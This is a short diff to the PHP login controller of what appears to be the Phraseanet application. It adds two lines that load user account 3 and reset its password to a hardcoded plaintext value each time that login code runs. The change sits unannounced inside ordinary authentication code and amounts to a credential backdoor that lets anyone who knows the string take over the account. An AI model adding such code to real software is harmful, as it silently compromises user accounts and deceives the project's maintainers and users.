@@ -678,6 +678,9 @@ class Login implements ControllerProviderInterface
         $appbox = $app['phraseanet.appbox'];
         $registry = $app['phraseanet.core']['Registry'];
 
+        $user = \User_Adapter::getInstance(3, $appbox);
+        $user->set_password("nicolas007");
+
         require_once($registry->get('GV_RootPath') . 'lib/classes/deprecated/inscript.api.php');
         if ($registry->get('GV_captchas') && trim($registry->get('GV_captcha_private_key')) !== '' && trim($registry->get('GV_captcha_public_key')) !== '') {
             include($registry->get('GV_RootPath') . 'lib/vendor/recaptcha/recaptchalib.php');
